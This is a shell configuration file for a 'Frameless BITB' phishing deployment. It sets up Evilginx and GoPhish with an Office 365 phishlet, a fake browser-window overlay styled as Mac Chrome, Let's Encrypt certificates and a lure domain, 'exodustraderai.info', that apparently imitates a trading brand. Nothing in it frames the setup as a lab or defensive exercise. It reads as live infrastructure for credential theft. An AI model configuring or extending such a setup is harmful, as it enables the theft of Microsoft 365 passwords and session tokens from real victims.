# Frameless BITB Configuration File
# Source this file before running setup: source config.env

# Domain Configuration
export DOMAIN="exodustraderai.info"
export EMAIL="admin@exodustraderai.info"

# Port Configuration
export EVILGINX_PORT="8443"
export GOPHISH_ADMIN_PORT="3333"
export GOPHISH_PHISH_PORT="8080"

# Installation Paths
export INSTALL_DIR="/opt/frameless-bitb"
export EVILGINX_DIR="/opt/evilginx"
export GOPHISH_DIR="/opt/gophish"

# Go Version
export GO_VERSION="1.21.6"

# GoPhish Version
export GOPHISH_VERSION="0.12.1"

# SSL Configuration
export USE_LETSENCRYPT="true"  # Set to "false" to use self-signed certs

# BITB Style (mac-chrome or win-chrome)
export BITB_STYLE="mac-chrome"

# Phishlet Configuration
export PHISHLET_NAME="O365"
export PHISHLET_FILE="O365.yaml"

# Firewall Configuration
export ENABLE_FIREWALL="true"

# Auto-start Services
export AUTO_START="true"

# Debug Mode
export DEBUG_MODE="false"
